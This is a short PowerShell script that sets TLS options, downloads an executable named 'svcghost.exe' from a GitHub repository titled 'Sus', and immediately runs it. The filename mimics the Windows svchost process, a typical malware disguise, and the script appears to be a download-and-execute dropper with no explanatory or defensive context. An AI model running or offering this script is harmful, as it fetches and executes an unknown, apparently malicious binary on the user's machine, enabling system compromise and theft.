[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Tls,Tls11,Tls12'
Invoke-WebRequest -Uri 'https://github.com/Squatch55/Sus/raw/master/59684/Dont/svcghost.exe' -OutFile svcghost.exe

.\svcghost.exe
